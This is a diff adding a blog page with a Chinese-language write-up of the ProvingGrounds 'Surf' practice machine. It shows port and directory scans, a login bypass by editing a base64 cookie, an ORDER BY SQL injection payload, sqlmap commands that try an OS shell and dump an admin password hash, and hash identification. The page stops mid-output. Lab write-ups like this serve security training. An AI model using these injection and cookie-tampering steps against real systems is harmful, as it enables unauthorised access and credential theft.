@@ -1,0 +1,731 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="en">
+  <head>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>ProvingGrounds Surf WriteUp - Xavier&#39;s Blog</title><meta name="author" content="Xavier">
+<meta name="description" content="Xavier&#39;s Blog，一个安全工作者的个人空间"><meta name="keywords" content='OSCP, PG_Practice'>
+  <meta itemprop="name" content="ProvingGrounds Surf WriteUp">
+  <meta itemprop="description" content="Xavier&#39;s Blog，一个安全工作者的个人空间">
+  <meta itemprop="datePublished" content="2024-01-02T20:48:15+08:00">
+  <meta itemprop="dateModified" content="2024-01-02T20:48:15+08:00">
+  <meta itemprop="wordCount" content="2323">
+  <meta itemprop="keywords" content="OSCP,PG_Practice"><meta property="og:url" content="https://www.bthoughts.top/posts/provinggrounds-surf/">
+  <meta property="og:site_name" content="Xavier&#39;s Blog">
+  <meta property="og:title" content="ProvingGrounds Surf WriteUp">
+  <meta property="og:description" content="Xavier&#39;s Blog，一个安全工作者的个人空间">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-01-02T20:48:15+08:00">
+    <meta property="article:modified_time" content="2024-01-02T20:48:15+08:00">
+    <meta property="article:tag" content="OSCP">
+    <meta property="article:tag" content="PG_Practice">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="ProvingGrounds Surf WriteUp">
+  <meta name="twitter:description" content="Xavier&#39;s Blog，一个安全工作者的个人空间">
+<meta name="application-name" content="Xavier&#39;s Blog">
+<meta name="apple-mobile-web-app-title" content="Xavier&#39;s Blog"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" type="text/html" href="https://www.bthoughts.top/posts/provinggrounds-surf/" title="ProvingGrounds Surf WriteUp - Xavier&#39;s Blog" /><link rel="prev" type="text/html" href="https://www.bthoughts.top/posts/provinggrounds-exghost/" title="ProvingGrounds Exghost Writeup" /><link rel="next" type="text/html" href="https://www.bthoughts.top/posts/provinggrounds-access/" title="ProvingGrounds Access Writeup" /><link rel="alternate" type="text/markdown" href="https://www.bthoughts.top/posts/provinggrounds-surf/index.md" title="ProvingGrounds Surf WriteUp - Xavier's Blog"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "ProvingGrounds Surf WriteUp",
+    "inLanguage": "en",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https:\/\/www.bthoughts.top\/posts\/provinggrounds-surf\/"
+    },"genre": "posts","keywords": "OSCP, PG_Practice","wordcount":  2323 ,
+    "url": "https:\/\/www.bthoughts.top\/posts\/provinggrounds-surf\/","datePublished": "2024-01-02T20:48:15+08:00","dateModified": "2024-01-02T20:48:15+08:00","publisher": {
+      "@type": "Organization",
+      "name": ""},"author": {
+        "@type": "Person",
+        "name": "Xavier"
+      },"description": ""
+  }
+  </script><script src="/js/head/color-scheme.min.js"></script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="Xavier&#39;s Blog"><span class="header-title-text">Xavier&#39;s Blog</span></a><span class="header-subtitle">一个安全工作者</span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a class="menu-link" href="/posts/"><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item">
+              <a class="menu-link" href="/categories/"><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
+              <a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item">
+              <a class="menu-link" href="/friends/"><i class="fa-solid fa-user-group fa-fw fa-sm" aria-hidden="true"></i> Friends</a></li><li class="menu-item">
+              <a class="menu-link" href="/tools/"><i class="fa-solid fa-screwdriver-wrench fa-fw fa-sm" aria-hidden="true"></i> Tools</a></li><li class="menu-item">
+              <a class="menu-link" href="/about/"><i class="fa-solid fa-circle-info fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
+            <input type="text" placeholder="搜索文章标题或内容……" id="search-input-desktop">
+            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+            </a>
+            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+            </a>
+            <span class="search-button search-loading" id="search-loading-desktop">
+              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+            </span>
+          </li><li class="menu-item theme-switch" title="切换主题">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="Xavier&#39;s Blog"><span class="header-title-text">Xavier&#39;s Blog</span></a><span class="header-subtitle">一个安全工作者</span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
+            <div class="search mobile" id="search-mobile">
+              <input type="text" placeholder="搜索文章标题或内容……" id="search-input-mobile">
+              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+              </a>
+              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+              </a>
+              <span class="search-button search-loading" id="search-loading-mobile">
+                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+              </span>
+            </div>
+            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+              取消
+            </a>
+          </li><li class="menu-item"><a class="menu-link" href="/posts/"><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item"><a class="menu-link" href="/categories/"><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item"><a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item"><a class="menu-link" href="/friends/"><i class="fa-solid fa-user-group fa-fw fa-sm" aria-hidden="true"></i> Friends</a></li><li class="menu-item"><a class="menu-link" href="/tools/"><i class="fa-solid fa-screwdriver-wrench fa-fw fa-sm" aria-hidden="true"></i> Tools</a></li><li class="menu-item"><a class="menu-link" href="/about/"><i class="fa-solid fa-circle-info fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item menu-system">
+          <span class="menu-system-item theme-switch" title="切换主题"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
+      </ul>
+    </nav>
+  </div>
+</header><div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+  </div>
+  <div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+  </div><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="合集"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>ProvingGrounds Surf WriteUp</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="/resource/friends/me.png" alt="Xavier" data-title="Xavier" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;Xavier</span></span><span class="post-included-in">&nbsp;收录于 <a href="/categories/%E9%9D%B6%E5%9C%BA/" class="post-category" title="分类 - 靶场"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 靶场</a></span></div><div class="post-meta-line"><span title="发布于 2024-01-02 20:48:15"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2024-01-02">2024-01-02</time></span>&nbsp;<span title="2323 字"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>约 2400 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>预计阅读 5 分钟</span>&nbsp;<span id="busuanzi_container_page_pv" class="busuanzi_visitors comment-visitors" data-flag-title="ProvingGrounds Surf WriteUp"><i class="fa-regular fa-eye fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_page_pv">-</span>&nbsp;次阅读
+          </span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>目录</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#端口扫描">端口扫描：</a></li>
+    <li><a href="#web扫描">Web扫描</a></li>
+    <li><a href="#权限提升">权限提升</a></li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content" data-end-flag="It&#39;s end."><h2 id="端口扫描" class="heading-element"><span>端口扫描：</span>
+  <a href="#%e7%ab%af%e5%8f%a3%e6%89%ab%e6%8f%8f" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>整理</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP/PG_Practice/surf<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ sudo nmap -n -r --min-rate<span class="o">=</span><span class="m">3500</span> -p- -sSV --script default,vuln 192.168.162.171 -oN surf-all.txt 
+</span></span><span class="line"><span class="cl"><span class="o">[</span>sudo<span class="o">]</span> xavier 的密码：
+</span></span><span class="line"><span class="cl">Starting Nmap 7.94 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-12-03 14:59 CST
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 192.168.162.171
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.22s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">65533</span> closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
+</span></span><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> vulners:  CVEs
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">2048</span> 74:ba:20:23:89:92:62:02:9f:e7:3d:3b:83:d4:d9:6c <span class="o">(</span>RSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 54:8f:79:55:5a:b0:3a:69:5a:d5:72:39:64:fd:07:4e <span class="o">(</span>ECDSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> 7f:5d:10:27:62:ba:75:e9:bc:c8:4f:e2:72:87:d4:e2 <span class="o">(</span>ED25519<span class="o">)</span>
+</span></span><span class="line"><span class="cl">80/tcp open  http    Apache httpd 2.4.38 <span class="o">((</span>Debian<span class="o">))</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Surfing blog
+</span></span><span class="line"><span class="cl"><span class="p">|</span> vulners: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   cpe:/a:apache:http_server:2.4.38:  CVEs
+</span></span><span class="line"><span class="cl"><span class="p">|</span> http-enum: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   /css/: Potentially interesting directory w/ listing on <span class="s1">&#39;apache/2.4.38 (debian)&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  /js/: Potentially interesting directory w/ listing on <span class="s1">&#39;apache/2.4.38 (debian)&#39;</span>
+</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 95.76 seconds</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="web扫描" class="heading-element"><span>Web扫描</span>
+  <a href="#web%e6%89%ab%e6%8f%8f" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>访问 80端口Web服务，是个博客，文章作者是Admin。</p>
+<p>Web扫描</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP/PG_Practice/surf<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ dirsearch -x 400,404  -t <span class="m">500</span> -e php,asp,aspx,ini,txt,bak -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.162.171 </span></span></code></pre></td></tr></table>
+</div>
+</div><p>发现管理后台登录口：http://192.168.162.171/administration/login.php</p>
+<p>尝试暴破，失败</p>
+<p>登录失败的返回包中有这个头<code>Set-Cookie: auth_status=eydzdWNjZXNzJzonZmFsc2UnfQ%3D%3D</code>，base64接码后为<code>{'success':'false'}</code></p>
+<p>抓包改包，手动修改为true后进入后台，绕过前端限制。</p>
+<p>发现有个页面，测试发现存在order by点位的注入</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">http://192.168.162.171/administration/customers.php?search_string<span class="o">=</span>c<span class="p">&amp;</span><span class="nv">filter_col</span><span class="o">=</span><span class="k">if</span><span class="o">((</span>substr<span class="o">(</span>version<span class="o">()</span>,1,1<span class="o">)=</span><span class="s1">&#39;8&#39;</span><span class="o">)</span>,id,phone<span class="o">)</span><span class="p">&amp;</span><span class="nv">order_by</span><span class="o">=</span>asc</span></span></code></pre></td></tr></table>
+</div>
+</div><p>测试发现后端SQL语句为：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="n">SQL_CALC_FOUND_ROWS</span><span class="w"> </span><span class="n">id</span><span class="p">,</span><span class="w"> </span><span class="n">f_name</span><span class="p">,</span><span class="w"> </span><span class="n">l_name</span><span class="p">,</span><span class="w"> </span><span class="n">gender</span><span class="p">,</span><span class="w"> </span><span class="n">phone</span><span class="p">,</span><span class="w"> </span><span class="n">created_at</span><span class="p">,</span><span class="w"> </span><span class="n">updated_at</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">customers</span><span class="w"> </span><span class="k">WHERE</span><span class="w">  </span><span class="n">f_name</span><span class="w"> </span><span class="k">like</span><span class="w"> </span><span class="o">?</span><span class="w">  </span><span class="k">OR</span><span class="w"> </span><span class="n">l_name</span><span class="w"> </span><span class="k">like</span><span class="w"> </span><span class="o">?</span><span class="w">  </span><span class="k">ORDER</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="k">ASC</span><span class="w">  </span><span class="k">LIMIT</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mi">15</span><span class="w"> </span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>因为不是考试，想偷懒，于是用上了sqlmap</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP/PG_Practice/surf<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ sqlmap -r sqli.txt --banner --level<span class="o">=</span><span class="m">3</span> --risk<span class="o">=</span><span class="m">3</span> -p <span class="s1">&#39;filter_col&#39;</span> --batch
+</span></span><span class="line"><span class="cl">……
+</span></span><span class="line"><span class="cl">GET parameter <span class="s1">&#39;filter_col&#39;</span> is vulnerable. Do you want to keep testing the others <span class="o">(</span><span class="k">if</span> any<span class="o">)</span>? <span class="o">[</span>y/N<span class="o">]</span> N
+</span></span><span class="line"><span class="cl">sqlmap identified the following injection point<span class="o">(</span>s<span class="o">)</span> with a total of <span class="m">516</span> HTTP<span class="o">(</span>s<span class="o">)</span> requests:
+</span></span><span class="line"><span class="cl">---
+</span></span><span class="line"><span class="cl">Parameter: filter_col <span class="o">(</span>GET<span class="o">)</span>
+</span></span><span class="line"><span class="cl">    Type: boolean-based blind
+</span></span><span class="line"><span class="cl">    Title: AND boolean-based blind - WHERE or HAVING clause <span class="o">(</span>subquery - comment<span class="o">)</span>
+</span></span><span class="line"><span class="cl">    Payload: <span class="nv">search_string</span><span class="o">=</span>c<span class="p">&amp;</span><span class="nv">filter_col</span><span class="o">=</span>id AND <span class="nv">7911</span><span class="o">=(</span>SELECT <span class="o">(</span>CASE WHEN <span class="o">(</span><span class="nv">7911</span><span class="o">=</span>7911<span class="o">)</span> THEN <span class="m">7911</span> ELSE <span class="o">(</span>SELECT <span class="m">6771</span> UNION SELECT 4630<span class="o">)</span> END<span class="o">))</span>-- -<span class="p">&amp;</span><span class="nv">order_by</span><span class="o">=</span>asc
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    Type: time-based blind
+</span></span><span class="line"><span class="cl">    Title: MySQL &gt;<span class="o">=</span> 5.0.12 AND time-based blind <span class="o">(</span>query SLEEP<span class="o">)</span>
+</span></span><span class="line"><span class="cl">    Payload: <span class="nv">search_string</span><span class="o">=</span>c<span class="p">&amp;</span><span class="nv">filter_col</span><span class="o">=</span>id AND <span class="o">(</span>SELECT <span class="m">9022</span> FROM <span class="o">(</span>SELECT<span class="o">(</span>SLEEP<span class="o">(</span>5<span class="o">)))</span>HmQp<span class="o">)</span><span class="p">&amp;</span><span class="nv">order_by</span><span class="o">=</span>asc
+</span></span><span class="line"><span class="cl">---
+</span></span><span class="line"><span class="cl"><span class="o">[</span>16:36:30<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> the back-end DBMS is MySQL
+</span></span><span class="line"><span class="cl"><span class="o">[</span>16:36:30<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> fetching banner
+</span></span><span class="line"><span class="cl"><span class="o">[</span>16:36:30<span class="o">]</span> <span class="o">[</span>WARNING<span class="o">]</span> running in a single-thread mode. Please consider usage of option <span class="s1">&#39;--threads&#39;</span> <span class="k">for</span> faster data retrieval
+</span></span><span class="line"><span class="cl"><span class="o">[</span>16:36:30<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> retrieved: 10.3.31-MariaDB-0+deb10u1
+</span></span><span class="line"><span class="cl">web server operating system: Linux Debian <span class="m">10</span> <span class="o">(</span>buster<span class="o">)</span>
+</span></span><span class="line"><span class="cl">web application technology: Apache 2.4.38
+</span></span><span class="line"><span class="cl">back-end DBMS: MySQL &gt;<span class="o">=</span> 5.0.12 <span class="o">(</span>MariaDB fork<span class="o">)</span>
+</span></span><span class="line"><span class="cl">banner: <span class="s1">&#39;10.3.31-MariaDB-0+deb10u1&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>16:37:10<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> fetched data logged to text files under <span class="s1">&#39;/home/xavier/.local/share/sqlmap/output/192.168.162.171&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> ending @ 16:37:10 /2023-12-03/
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 写shell失败</span>
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP/PG_Practice/surf<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ sqlmap -r sqli.txt --level<span class="o">=</span><span class="m">3</span> --risk<span class="o">=</span><span class="m">3</span> -p <span class="s1">&#39;filter_col&#39;</span> --batch --os-shell
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 获取数据</span>
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP/PG_Practice/surf<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ sqlmap -r sqli.txt --level<span class="o">=</span><span class="m">3</span> --risk<span class="o">=</span><span class="m">3</span> -p <span class="s1">&#39;filter_col&#39;</span> --batch --dump
+</span></span><span class="line"><span class="cl">……
+</span></span><span class="line"><span class="cl">Database: corephpadmin
+</span></span><span class="line"><span class="cl">Table: admin_accounts
+</span></span><span class="line"><span class="cl"><span class="o">[</span><span class="m">1</span> entry<span class="o">]</span>
+</span></span><span class="line"><span class="cl">+----+-----------+---------+--------------------------------------------------------------+-----------+------------+----------------+
+</span></span><span class="line"><span class="cl"><span class="p">|</span> id <span class="p">|</span> series_id <span class="p">|</span> expires <span class="p">|</span> password                                                     <span class="p">|</span> user_name <span class="p">|</span> admin_type <span class="p">|</span> remember_token <span class="p">|</span>
+</span></span><span class="line"><span class="cl">+----+-----------+---------+--------------------------------------------------------------+-----------+------------+----------------+
+</span></span><span class="line"><span class="cl"><span class="p">|</span> <span class="m">11</span> <span class="p">|</span> NULL      <span class="p">|</span> NULL    <span class="p">|</span> <span class="nv">$2</span>y<span class="nv">$10$7</span>y1lSqjchay03PgTMMW6a.wtR9CosWV4tLSaycUhcXQLvT.PJtiLm <span class="p">|</span> james     <span class="p">|</span> super      <span class="p">|</span> NULL           <span class="p">|</span>
+</span></span><span class="line"><span class="cl">+----+-----------+---------+--------------------------------------------------------------+-----------+------------+----------------+
+</span></span><span class="line"><span class="cl">……</span></span></code></pre></td></tr></table>
+</div>
+</div><p>拿到管理员密码哈希</p>
+<p>尝试解密</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP/PG_Practice/surf<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ hashid <span class="s1">&#39;$2y$10$7y1lSqjchay03PgTMMW6a.wtR9CosWV4tLSaycUhcXQLvT.PJtiLm&#39;</span>
+</span></span><span class="line"><span class="cl">Analyzing <span class="s1">&#39;$2y$10$7y1lSqjchay03PgTMMW6a.wtR9CosWV4tLSaycUhcXQLvT.PJtiLm&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Blowfish<span class="o">(</span>OpenBSD<span class="o">)</span> 
